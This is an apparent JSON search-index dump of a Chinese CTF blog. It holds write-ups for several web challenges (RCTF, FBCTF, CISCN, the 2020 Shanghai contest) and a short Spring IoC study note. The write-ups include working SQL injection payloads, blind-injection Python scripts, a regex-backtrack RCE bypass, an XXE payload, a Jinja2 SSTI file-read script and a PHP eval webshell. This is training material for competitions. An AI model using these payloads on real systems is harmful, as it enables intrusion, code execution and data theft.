{"meta":{"title":"月出从云","subtitle":"","description":"","author":null,"url":"http://example.com","root":"/"},"pages":[{"title":"AWD","date":"2014-12-22T04:39:04.000Z","updated":"2020-11-17T06:14:07.642Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"CTF","date":"2020-11-17T05:49:23.000Z","updated":"2020-11-17T06:11:45.482Z","comments":true,"path":"categories/index-1.html","permalink":"http://example.com/categories/index-1.html","excerpt":"","text":""},{"title":"BUU","date":"2020-11-17T06:04:40.000Z","updated":"2020-11-17T06:16:19.998Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""},{"title":"ssti","date":"2020-11-17T06:06:49.000Z","updated":"2020-11-17T06:16:27.450Z","comments":true,"path":"tags/index-1.html","permalink":"http://example.com/tags/index-1.html","excerpt":"","text":""},{"title":"比赛","date":"2020-11-17T06:07:10.000Z","updated":"2020-11-17T06:16:31.708Z","comments":true,"path":"tags/index-2.html","permalink":"http://example.com/tags/index-2.html","excerpt":"","text":""},{"title":"SQL注入","date":"2020-11-17T06:07:24.000Z","updated":"2020-11-17T06:16:34.701Z","comments":true,"path":"tags/index-3.html","permalink":"http://example.com/tags/index-3.html","excerpt":"","text":""},{"title":"Java","date":"2020-11-17T06:07:36.000Z","updated":"2020-11-17T06:16:38.291Z","comments":true,"path":"tags/index-4.html","permalink":"http://example.com/tags/index-4.html","excerpt":"","text":""},{"title":"AWD","date":"2020-11-17T06:07:49.000Z","updated":"2020-11-17T06:08:03.116Z","comments":true,"path":"tags/index-5.html","permalink":"http://example.com/tags/index-5.html","excerpt":"","text":""},{"title":"渗透","date":"2020-11-17T06:09:45.000Z","updated":"2020-11-17T06:16:44.308Z","comments":true,"path":"tags/index-6.html","permalink":"http://example.com/tags/index-6.html","excerpt":"","text":""},{"title":"开发","date":"2020-11-17T06:11:43.000Z","updated":"2020-11-17T06:12:00.335Z","comments":true,"path":"categories/index-2.html","permalink":"http://example.com/categories/index-2.html","excerpt":"","text":""},{"title":"渗透","date":"2020-11-17T06:12:08.000Z","updated":"2020-11-17T06:12:21.520Z","comments":true,"path":"categories/index-3.html","permalink":"http://example.com/categories/index-3.html","excerpt":"","text":""},{"title":"php","date":"2020-11-17T06:18:09.000Z","updated":"2020-11-17T06:18:40.651Z","comments":true,"path":"tags/index-7.html","permalink":"http://example.com/tags/index-7.html","excerpt":"","text":""},{"title":"反序列化","date":"2020-11-17T06:18:43.000Z","updated":"2020-11-17T06:18:51.497Z","comments":true,"path":"tags/index-8.html","permalink":"http://example.com/tags/index-8.html","excerpt":"","text":""},{"title":"nodejs","date":"2020-11-17T06:18:56.000Z","updated":"2020-11-17T06:19:16.847Z","comments":true,"path":"tags/index-9.html","permalink":"http://example.com/tags/index-9.html","excerpt":"","text":""},{"title":"search","date":"2020-11-17T06:21:26.000Z","updated":"2020-11-17T06:21:42.054Z","comments":true,"path":"search/index.html","permalink":"http://example.com/search/index.html","excerpt":"","text":""}],"posts":[{"title":"RCTF2015EasySQL","slug":"RCTF2015EasySQL","date":"2020-11-18T09:57:30.000Z","updated":"2020-11-18T14:11:21.941Z","comments":true,"path":"2020/11/18/RCTF2015EasySQL/","link":"","permalink":"http://example.com/2020/11/18/RCTF2015EasySQL/","excerpt":"","text":"考点：一个SQL注入，二次注入+报错注入 当我们注册用户修改密码的时候便会触发 我们可以测试一下被过滤了什么： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198length +handlerlikeselect sleepdatabasedeletehavingoras-~BENCHMARKlimitleftselectinsertsys.schema_auto_increment_columnsjoinright#&amp;&amp;&amp;\\handler-- -----+INFORMATION--;!%+xor&lt;&gt;(&gt;&lt;).^=ANDBYCASTCOLUMNCOUNTCREATEENDcase&#x27;1&#x27;=&#x27;1whenadmin&#x27;&quot;length +lengthREVERSEasciiselect databaseleftright&#x27;union||oorr/////**/*/**/ananddGROUPHAVINGIFINTOJOINLEAVELEFTLEVELsleepLIKENAMESNEXTNULLOFON|infromation_schemauserORORDERORDSCHEMASELECTSETTABLETHENUPDATEUSERUSINGVALUEVALUESWHENWHEREADDANDpreparesetupdatedeletedropinsetCASTCOLUMNCONCATGROUP_CONCATgroup_concatCREATEDATABASEDATABASESalterDELETEDROPfloorrand()information_schema.tablesTABLE_SCHEMA%dfconcat_ws()concatLIMITORDONextractvalueorder CAST()byORDEROUTFILERENAMEREPLACESCHEMASELECTSETupdatexmlSHOWSQLTABLETHENTRUEinstrbenchmarkformatbinsubstringordUPDATEVALUESVARCHARVERSIONWHENWHERE/*` ,users%0a%0bmidforBEFOREREGEXPRLIKEinsys schemmaSEPARATORXORCURSORFLOORsys.schema_table_statistics_with_bufferINFILEcount%0cfrom%0d%a0=@else 直接用别人的字典来查一下 大概对我们注入有影响的只有空格，select的话我们可以用大小写的方式进行绕过，于是去mysql里面尝试构造出语句： 1234567mysql&gt; select * from websites where id &#x3D;1 and(select updatexml(1,concat(&#39;~&#39;,(select(database()))),1));ERROR 1105 (HY000): XPATH syntax error: &#39;~runoob&#39;mysql&gt; select * from websites where id &#x3D;1 and(select updatexml(1,concat(&#39;~&#39;,(select(database()))),1));ERROR 1105 (HY000): XPATH syntax error: &#39;~runoob&#39;mysql&gt; select * from websites where id &#x3D;1 and(select(updatexml(1,concat(&#39;~&#39;,(select(database()))),1)));ERROR 1105 (HY000): XPATH syntax error: &#39;~runoob&#39; 得到注入语句： 12admin&quot;^(select(updatexml(1,concat(&#x27;~&#x27;,(select(database()))),1)))##XPATH syntax error: &#x27;~web_sqli&#x27; 得到数据库的名字. 下一步获取表名： 1admin&quot;^(select(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema&#x3D;database()))),0x7e)))# 这样的话会报错，Subquery returns more than 1 row，因为不止一个表，那我们添加group_concat函数 在mysql中测试： 12345mysql&gt; select * from student where STID&#x3D;1 and (select(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema&#x3D;database()))),0x7e)));ERROR 1242 (21000): Subquery returns more than 1 rowmysql&gt; select * from student where STID&#x3D;1 and (select(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database()))),0x7e)));ERROR 2013 (HY000): Lost connection to MySQL server during querymysql&gt; select * from student where STID&#x3D;1 and (select(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database()))),0x7e))); 得到表名： 1XPATH syntax error: &#x27;~article,flag,users&#x27; 这里提前剧透一下，flag表的东西是假flag，纯粹作者搞心态的，我一直觉得这种东西很多余好吧。 123mysql&gt; select * from student WHERE STID&#x3D;1 and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name&#x3D;&quot;student&quot;)),0x7e));ERROR 1105 (HY000): XPATH syntax error: &#39;~STID,STNAME,STSEX,STAGE,STPHONE&#39;mysql&gt; select * from student WHERE STID&#x3D;1 and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name&#x3D;&quot;student&quot;)),0x7e)); 得到字段名： 1XPATH syntax error: &#x27;~name,pwd,email,real_flag_1s_her&#x27; 这里其实我们就可以发现一个不方便的地方了，报错注入的回显是有限的，所以这里后面应该是here，却没有显示出来 注入： 1admin&quot;^(select(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users))),0x7e)))# 得到的东西很奇怪： ~xxxx,xxx,xxx什么的，这就很恶心人了，于是我们尝试用正则表达式来匹配我们需要的数据 别人的语句： 12admin&quot;||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;))),1))# 得到前半段的flag： 1XPATH syntax error: &#39;:flag&#123;8091937b-0547-42a3-b7b3-41&#39; 这样的话还是不够，我们应该获取全部的数据，于是继续构造： 12345678910111213141516ERROR 1105 (HY000): XPATH syntax error: &#39;~fuzhufuzh&#39;mysql&gt; select * from student where STID &#x3D;1 and(select(updatexml(1,concat(0x7e,(select(group_concat(STNAME))from student)),0x7e)));ERROR 1105 (HY000): XPATH syntax error: &#39;~fuzhufuzh&#39;mysql&gt; select * from student where STID &#x3D;1 and(select(updatexml(1,concat(0x7e,(select reverse((group_concat(STNAME)))from student)),0x7e)));ERROR 1105 (HY000): XPATH syntax error: &#39;~hzufuhzuf&#39;mysql&gt; select * from student where STID &#x3D;1 and(select(updatexml(1,concat(0x7e,(select(reverse((group_concat(STNAME))))from student)),0x7e)));ERROR 2013 (HY000): Lost connection to MySQL server during querymysql&gt; select * from student where STID &#x3D;1 and(select(updatexml(1,concat(0x7e,(select(reverse((group_concat(STNAME))))from student)),0x7e)));ERROR 2006 (HY000): MySQL server has gone awayNo connection. Trying to reconnect...Connection id: 11Current database: webosERROR 1105 (HY000): XPATH syntax error: &#39;~hzufuhzuf&#39;mysql&gt; select * from student where STID &#x3D;1 and(select(updatexml(1,concat(0x7e,(select(reverse((group_concat(STNAME))))from student)),0x7e))); 因为Markdown自动的弱智不全，导致我fuzz了巨他妈久 12admin&quot;||(updatexml(1,concat(0x3a,(select(reverse(group_concat(real_flag_1s_here)))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;))),1))# 得到flag： 1flag&#123;8091937b-0547-42a3-b7b3-415a267a6a46&#125;","categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"},{"name":"SQL注入","slug":"SQL注入","permalink":"http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"FBCTF2018RCEService","slug":"FBCTF2018RCEService","date":"2020-11-17T07:15:27.000Z","updated":"2020-11-17T07:51:04.195Z","comments":true,"path":"2020/11/17/FBCTF2018RCEService/","link":"","permalink":"http://example.com/2020/11/17/FBCTF2018RCEService/","excerpt":"","text":"要盲试试出来。。。大佬说是有源码： 123456789101112131415161718192021222324&lt;?phpputenv(&#x27;PATH=/home/rceservice/jail&#x27;);if (isset($_REQUEST[&#x27;cmd&#x27;])) &#123; $json = $_REQUEST[&#x27;cmd&#x27;]; if (!is_string($json)) &#123; echo &#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;; &#125; elseif (preg_match(&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\\x00-\\x1FA-Z0-9!#-\\/;-@\\[-`|~\\x7F]+).*$/&#x27;, $json)) &#123; echo &#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;; &#125; else &#123; echo &#x27;Attempting to run command:&lt;br/&gt;&#x27;; $cmd = json_decode($json, true)[&#x27;cmd&#x27;]; if ($cmd !== NULL) &#123; system($cmd); &#125; else &#123; echo &#x27;Invalid input&#x27;; &#125; echo &#x27;&lt;br/&gt;&lt;br/&gt;&#x27;; &#125;&#125;?&gt; 这道题注意这里： 1putenv(&#x27;PATH=/home/rceservice/jail&#x27;); 所以我们想要执行命令的话必须通过/bin/cat来执行系统命令（本人不是很能明白原因。。） 正则绕过，这里可以通过P牛大佬的文章： 1https:&#x2F;&#x2F;www.leavesongs.com&#x2F;PENETRATION&#x2F;use-pcre-backtrack-limit-to-bypass-restrict.html 阅读P牛大佬的文章，大致意思是，PHP的正则并不是通过根据正则的匹配来决定下一步的，如果满足条件的话，正则便会无限的向后匹配，直到末尾之后，如果正则没有能够成功匹配结尾，就会往回回溯，来查找到满足条件的情况 类似P牛大佬的例子，如果按照我们的思路的话，当匹配到 ;的时候，已经匹配成功，所以就应该停下来了，但是由于.*可以匹配任意，故我们会一直匹配到最后一步，但此时正则没有匹配成功，就会往前推，直到正则匹配成功。 又因为P牛师傅说的，只要回溯100000此就会失败，所以我们发送一串超级长的字符串即可 123456789import requestsparams = &#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;123&quot;:&quot;&#x27; + &quot;a&quot;*(1000000) + &#x27;&quot;&#125;&#x27;params = &#123;&quot;cmd&quot;:params&#125;url = &quot;http://e23f7266-20a3-4aa0-bfbc-8a9502764002.node3.buuoj.cn&quot;res = requests.post(url=url,data=params).textprint(res) 注意这里一定要发送post包，get包无法接受这么长的参数，传过去就可以得到flag了","categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"},{"name":"php","slug":"php","permalink":"http://example.com/tags/php/"}]},{"title":"PHP的一个内置类","slug":"PHP的一个内置类","date":"2020-11-16T13:41:28.000Z","updated":"2020-11-16T13:50:35.444Z","comments":true,"path":"2020/11/16/PHP的一个内置类/","link":"","permalink":"http://example.com/2020/11/16/PHP%E7%9A%84%E4%B8%80%E4%B8%AA%E5%86%85%E7%BD%AE%E7%B1%BB/","excerpt":"","text":"某店里比赛题目： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119&lt;?phpclass User&#123; private static $c = 0; public function __construct($ra,$rb) &#123;// $c = $ra;// $c = $rb; &#125; function a() &#123; return ++self::$c; &#125; function b() &#123; return ++self::$c; &#125; function c() &#123; return ++self::$c; &#125; function d() &#123; return ++self::$c; &#125; function e() &#123; return ++self::$c; &#125; function f() &#123; return ++self::$c; &#125; function g() &#123; return ++self::$c; &#125; function h() &#123; return ++self::$c; &#125; function i() &#123; return ++self::$c; &#125; function j() &#123; return ++self::$c; &#125; function k() &#123; return ++self::$c; &#125; function l() &#123; return ++self::$c; &#125; function m() &#123; return ++self::$c; &#125; function n() &#123; return ++self::$c; &#125; function o() &#123; return ++self::$c; &#125; function p() &#123; return ++self::$c; &#125; function q() &#123; return ++self::$c; &#125; function r() &#123; return ++self::$c; &#125; function s() &#123; return ++self::$c; &#125; function t() &#123; return ++self::$c; &#125;&#125;$rc=$_GET[&quot;rc&quot;];$rb=$_GET[&quot;rb&quot;];$ra=$_GET[&quot;ra&quot;];$rd=$_GET[&quot;rd&quot;];$method= new $rc($ra, $rb);var_dump($method-&gt;$rd()); 我们可以控制四个参数，但是我们明显知道，这里的User类完全没有意义，题目给出提示让我们想想还有什么类，想了半天应该是内置类，队里的w4nder师傅直接给我exp了，WTM直接开舔 1?rc&#x3D;SimpleXMLElement&amp;ra&#x3D;&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;index.php&quot;&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;&#x2F;x&gt;&amp;rb&#x3D;2&amp;rd&#x3D;__toString","categories":[],"tags":[]},{"title":"CISCN2019DAY2WEB1","slug":"CISCN2019DAY2WEB1","date":"2020-11-16T09:53:14.000Z","updated":"2020-11-17T06:15:49.535Z","comments":true,"path":"2020/11/16/CISCN2019DAY2WEB1/","link":"","permalink":"http://example.com/2020/11/16/CISCN2019DAY2WEB1/","excerpt":"","text":"虽然对于SQL注入我个人是相当不屑的。当前的环境下已经存在彻底磨灭SQL注入的技术了，但是比赛出现的频率依然不低，所以只能把它捡回来了。。orz 拿到文件先从这道题开始说吧，扫目录能扫出来robots.txt,下面有*.php.bak,提示我们可以尝试读取文件， 得到代码我将他稍微修改方便fuzz之后长这样： 12345678910111213141516171819&lt;?php// include &quot;config.php&quot;; $id = $_POST[1]; echo $id; echo &quot;&lt;br&gt;&quot;; $id=addslashes($id); $path=addslashes($path); echo $id; echo &quot;&lt;br&gt;&quot;; $id=str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\&#x27;&quot;,&quot;&#x27;&quot;),&quot;&quot;,$id); $path=str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\&#x27;&quot;,&quot;&#x27;&quot;),&quot;&quot;,$path); echo $id;// $result=mysqli_query($con,&quot;select * from images where id=&#x27;&#123;$id&#125;&#x27; or path=&#x27;&#123;$path&#125;&#x27;&quot;);// $row=mysqli_fetch_array($result,MYSQLI_ASSOC);// $path=&quot;./&quot; . $row[&quot;path&quot;];// header(&quot;Content-Type: image/jpeg&quot;);// readfile($path); 明确目标我们想要得到的目标是什么，很明显，这道题的查询语句如下： 1$result=mysqli_query($con,&quot;select * from images where id=&#x27;&#123;$id&#125;&#x27; or path=&#x27;&#123;$path&#125;&#x27;&quot;); 注入原理分析其中id和path都是我们可控的，在这种情况下，我们其实可以通过吞掉id后面的单引号的方式，进而达到控制查询语句的操作，如图所示： 在SQL语句当中，\\转义也是存在的，只要该符号存在，便会自动的对数据进行转义，比如： 如果 在单引号面前加上\\，就会被系统认定为字符串类型的 ‘ ,也就起不到闭合语句的作用了。 回到注入上来，我们如果想要逃逸掉对id的注入，想要自己控制语句的话，应该构造如下代码： 通过上面的分析我们可以知道，id后面的单引号由于被\\进行了修饰，也就无法起到闭合的作用了，而 name的部分被我们的单引号闭合之后，再通过或逻辑，就可以控制任意查询了。 题目的绕过上面一段中我们已经知道第一步的中我们的目标是对id进行控制，使得id最终输出的值最终为 斜杠（\\），这样就可以使用path进行注入了，但是我们发现id和path其实都被修饰了，也就无法直接输入斜杠来绕过，利用上面的代码演示如下： 这道题的关键代码如下： 12$id=str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\&#x27;&quot;,&quot;&#x27;&quot;),&quot;&quot;,$id);$path=str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\&#x27;&quot;,&quot;&#x27;&quot;),&quot;&quot;,$path); 我们首先要知道的是，虽然这里写的是\\0 ,然而实际上依然是\\0,前面的\\是用于转义的。 这样想的话，我们便可以通过构造\\0的方式来尝试绕过 顺序如下 我们输入的为”\\0” -&gt; 经过addslashes函数之后”\\\\0”,再经过str_replace函数之后即为\\了， 那这里可能就有人想问了，为什么不用\\‘ 来绕过，这是因为如果使用\\ 和 ‘组合方式，经过addslashes的时候这两个符号都会被转义，这样的话我们就没有办法利用str_replace函数，于是我们构造payload第一步如下： 逐步fuzz.. 最终在mysql当中得到如下语句可以fuzz： 1select * from websites where id = if( ord( substr((select database() ),1,1 ))&gt;145,1,2); 于是构造出在url当中： 1http:&#x2F;&#x2F;a624b8c4-8225-4f4b-8681-7f29d013c51b.node3.buuoj.cn&#x2F;image.php?id&#x3D;\\0&amp;path&#x3D;or id&#x3D;if( ord( substr((select database() ),1,1 ))&gt;&#x3D;99,1,0) %23 那么就该构造脚本了 1234567891011121314151617181920212223import requestsurl = &quot;http://a624b8c4-8225-4f4b-8681-7f29d013c51b.node3.buuoj.cn/image.php?id=\\\\0&amp;path=&quot;# 上面的id一定要手动加上一个\\进行转义，不然会出错的# print(url)# print(len(requests.get(&quot;http://a624b8c4-8225-4f4b-8681-7f29d013c51b.node3.buuoj.cn/image.php?id=\\\\0&amp;path= or&quot;).text))# len = 117007flag = &quot;&quot;for i in range(1, 999): for j in range(47, 140): sql = &quot;or id=if( ord( substr((select password from users ),&#123;&#125;,1 ))&gt;=&#123;&#125;,1,0) %23&quot;.format(i, j) # print(url+sql) # databasename = djtdogjob res = requests.get(url + sql).text if len(res) &lt; 1170: print(len(res)) print(chr(j-1)) flag += chr(j-1) print(&quot;flag:&quot; + flag) i += 1 break 过了非常非常久才出来..其实建议用二分法脚本： 123456789101112131415161718192021import requestsurl = &quot;http://a624b8c4-8225-4f4b-8681-7f29d013c51b.node3.buuoj.cn/image.php?id=\\\\0&amp;path=&quot;payload = &quot;or id=if(ascii(substr((select password from users),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)%23&quot;result = &quot;&quot;for i in range(1,100): l = 1 r = 130 mid = (l + r)&gt;&gt;1 while(l&lt;r): payloads = payload.format(i,mid) # print(url+payloads) html = requests.get(url+payloads) if &quot;JFIF&quot; in html.text: l = mid +1 else: r = mid mid = (l + r)&gt;&gt;1 result+=chr(mid) print(result) 再之后是利用短标签上传PHP文件 除此之外我们也要注意到的是他这里是将你的filename写入到这个文件下面，所以我们将一句话写道这个文件下面 1&lt;?=eval($_POST[1]);?&gt;","categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"}]},{"title":"2020上海市网络安全大赛","slug":"2020上海市网络安全大赛","date":"2020-11-14T08:34:25.000Z","updated":"2020-11-17T06:03:38.282Z","comments":true,"path":"2020/11/14/2020上海市网络安全大赛/","link":"","permalink":"http://example.com/2020/11/14/2020%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/","excerpt":"","text":"注入杯，感觉也是自闭的一天orz,垃圾文章，只不过是记录一下脚本 千毒网盘 1https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_30258901&#x2F;article&#x2F;details&#x2F;96605162 在这个🔗下我们可以找到的！利用比较简单，如果我们需要的参数在get上，可以构造如下： 123?code = xx_GET[code] =xx只需要两者保持一致即可 如果在POST上，则反过来： 12?_POST[code] =xxcode =xx 由于$$key_2 == $value_2使得POST的值被unset了，绕过waf，后面再次extract造成变量覆盖 然后是布尔盲注，这里用–+代替#，不然会出现错误情况 队里师傅的脚本： 12345678910111213141516171819202122232425262728293031323334import requestsimport stringurl=&quot;http://eci-2zehpt4jc1z3f9vgcraf.cloudeci1.ichunqiu.com/index.php&quot;text=&#x27;&#x27;proxies=&#123;&#x27;http&#x27;:&#x27;127.0.0.1:8080&#x27;,&#x27;https&#x27;:&#x27;127.0.0.1:8080&#x27;&#125;headers = &#123; &quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;&#125;for i in range(1,200): l=28 h=126 while abs(h - l) &gt; 1: m=(l+h)/2 pay=&quot;select flag from flag&quot; #pay=&quot;database()&quot; e = &quot;(ascii(mid((&#123;&#125;),&#123;&#125;,1)))&gt;&#123;&#125;&quot;.format(pay, i, m) data = &quot;code=114514&#x27;and if((&#123;&#125;),1,0)--+&quot;.format(e) #print(data) #print(url+&quot;?_POST[code]=&quot;+data[&#x27;code&#x27;]) re=requests.post(url+&quot;?_POST[code]=&quot;+data.strip(&#x27;code=&#x27;),data=data,headers=headers) #print(re.text) #print(data) #exit() if &#x27;http://gamectf.com/p/CGBU.png&#x27; in re.text: l=m else: h=m mid_num = int((l + h + 1) / 2) text += chr(int(h)) print(text) TryToLogin这道题目是格式化字符串注入，感觉有必要学习一下,sprintf 12345678910111213141516171819202122232425262728import requestsimport stringurl&#x3D;&quot;http:&#x2F;&#x2F;eci-2ze4elsbeer15p6dsvx2.cloudeci1.ichunqiu.com&#x2F;index.php&quot;text&#x3D;&#39;&#39;proxies&#x3D;&#123;&#39;http&#39;:&#39;127.0.0.1:8080&#39;,&#39;https&#39;:&#39;127.0.0.1:8080&#39;&#125;headers &#x3D; &#123; &quot;Content-Type&quot;:&quot;application&#x2F;x-www-form-urlencoded&quot;&#125;for i in range(1,200): l&#x3D;28 h&#x3D;126 while abs(h - l) &gt; 1: m&#x3D;(l+h)&#x2F;2 pay&#x3D;&quot;select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema&#x3D;database()&quot; pay&#x3D;&quot;select * from fl4g&quot; e &#x3D; &quot;(ascii(mid((&#123;&#125;),&#123;&#125;,1)))&gt;&#123;&#125;&quot;.format(pay, i, m) data &#x3D;&quot;password&#x3D;%1$&#39;||if((&#123;&#125;),1,0)--+&quot;.format(e)+&#39;&amp;username&#x3D;admin&#39; re&#x3D;requests.post(url,data&#x3D;data,headers&#x3D;headers) if &#39;登录成功了&#39; in re.text: l&#x3D;m else: h&#x3D;m text +&#x3D; chr(int(h)) print(text) SSTI123456789101112131415161718192021222324252627282930313233343536373839from flask import Flask,request,render_templatefrom jinja2 import Templateimport osapp = Flask(__name__)f = open(&#x27;/flag&#x27;,&#x27;r&#x27;)flag = f.read()@app.route(&#x27;/&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])def home(): name = request.args.get(&quot;name&quot;) or &quot;&quot; print(name) if name: return render_template(&#x27;index.html&#x27;,name=name) else: return render_template(&#x27;index.html&#x27;)@app.route(&#x27;/help&#x27;,methods=[&#x27;GET&#x27;])def help(): help = &#x27;&#x27;&#x27; &#x27;&#x27;&#x27; return f.read()@app.errorhandler(404)def page_not_found(e): #No way to get flag! os.system(&#x27;rm -f /flag&#x27;) url = name = request.args.get(&quot;name&quot;) or &quot;&quot; r = request.path r = request.data.decode(&#x27;utf8&#x27;) if &#x27;eval&#x27; in r or &#x27;popen&#x27; in r or &#x27;&#123;&#123;&#x27; in r: t = Template(&quot; Not found!&quot;) return render_template(t), 404 t = Template(r + &quot; Not found!&quot;) return render_template(t), 404if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;,port=8888) 这道题比较新有意思的点在两个地方： 过滤了这个地方 1if &#x27;eval&#x27; in r or &#x27;popen&#x27; in r or &#x27;&#123;&#123;&#x27; in r: 过滤了左右花括号,这样子的情况以前自己没有遇过，后来知道可以进行盲注，并且我们可以尝试读取文件，读取文件的payload如下： 1&#123;% if self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;your file name &quot;).read()[1:2] &#x3D;&#x3D; &quot;a&quot; %&#125;~p0~&#123;% endif %&#125; 如果满足条件，则会输出p0，否则就不会输出。第二点，我们该读取什么文件呢？ 这里运用了os.system(“rm -f /flag”) 默认的进程删除后会存放在暂时文件中，进程为： 1/proc/self/fd/3 故编写脚本如下： 12345678910111213141516171819202122import requestsimport stringurl = &#x27;http://eci-2ze006f3h1dkgrldoskz.cloudeci1.ichunqiu.com:8888/a&#x27;headers=&#123; &#x27;Content-Type&#x27;:&#x27;application/json&#x27;&#125;def check(payload): r = requests.post(url, data=payload,headers=headers).text return &#x27;~p0~&#x27; in rpassword = &#x27;&#x27;sa=string.printable#print(s)for i in range(0,100): for c in sa: payload=&#x27;&#123;% if self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;/proc/self/fd/3&quot;).read()[&#x27; + str(i) + &#x27;:&#x27; + str( i + 1) + &#x27;] == &quot;&#x27; + c + &#x27;&quot; %&#125;~p0~&#123;% endif %&#125;&#x27; # print(payload) if check(payload): password += c break print(password)","categories":[],"tags":[]},{"title":"Spring学习","slug":"Spring学习","date":"2020-11-10T13:58:01.000Z","updated":"2020-11-17T06:09:39.491Z","comments":true,"path":"2020/11/10/Spring学习/","link":"","permalink":"http://example.com/2020/11/10/Spring%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"Spring从今天开始学Sping1.IOC理论推导： UserDao接口 UserDaompl实现类 Userservice业务接口 UserServiceimpl 业务实现类 在之前的业务当中，用户的需求会修改我们的代码，导致代码难以维护，所以我们开始使用了set值植入，set接口，实现不用修改代码，用户只需要调用接口就可以了。 123456789public class UserServiceimp1 implements UserService &#123; private UserDao userDao = new UserDaolmp1(); public void getUser()&#123; userDao.getuser(); &#125;&#125; 先前的代码，在我们调用UserDao的时候因为写死了拓展，所以无法灵活的调用，我们可以使用接口的思想解放 123456789 public void setUserDao(UserDao userDao) &#123; this.userDao = userDao; &#125; public void getUser()&#123; userDao.getuser(); &#125;&#125; ​ 我们将之前写死的代码转变成了set方法，这样子当我们于main方法当中使用的时候： 12345678910public class MyTest &#123; public static void main(String[] args) &#123; UserServiceimp1 userService = new UserServiceimp1(); userService.setUserDao(new UserDaoMysql()); userService.getUser();// 用户实际调用业务层，dao层不需要接触 &#125;&#125; 用户只需要在set后面更改接口就可以了！ IOC的三层架构：Dao层负责实现方法，Service层负责调用Dao的方法，而main方法去调用Service的接口 使用该方法大大降低了业务的耦合性，使得业务的每一部分专心于做好自己的架构即可。 2.IOC的本质​ 控制反转IoC(Inversion of Control),是一种设计思想，DI(依赖注入)是实现IoC的一种方法，也有人认为DI只是IoC的另-种说法。 没有IoC的程序中 ,我们使用面向对象编程 ,对象的创建 与对象间的依赖关系完全硬编码在程序中，对象的创建由程序自己控制，控制反转后将对象的创建转移给第三方，个人认为所谓控制反转就是:获得依赖对象的方式反转了。 ​ 而IOC就是Spring的核心思想！ 3.HelloSpring首先我们需要创建一个类： 12345678910111213141516public class HelloSpring &#123; private String str; public String getStr() &#123; return str; &#125; public void setStr(String str) &#123; this.str = str; &#125; public String tostring() &#123; return &quot;hello&quot;+&quot;str=&quot;+str+&#x27;\\&#x27;&#x27;; &#125;&#125; 创建beans.xml，写入如下： 12345&lt;!-- 使用spring创建对象，这些对象都称为bean--&gt;&lt;bean id=&quot;hello&quot; class=&quot;com.ysllz.pojo.HelloSpring&quot;&gt; &lt;property name=&quot;str&quot; value=&quot;Spring&quot;/&gt; &lt;!-- 属性--&gt;&lt;/bean&gt; 在这里，Spring帮我们做了这么一个事情： 在java当中，我们创建类的时候都是 类 对象名 = new 对象； 而在Spring当中，id为注册的对象名，property当中即可调用类当中的方法，value用于给方法的变量赋值。 12345678910public class Mytest &#123; public static void main(String[] args) &#123;// 获取spring的上下文对象 ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext(&quot;beans.xml&quot;);// 接下来我们用Spring的管理即可 HelloSpring hello = (HelloSpring) context.getBean(&quot;hello&quot;); System.out.println(hello.tostring()); &#125;&#125; 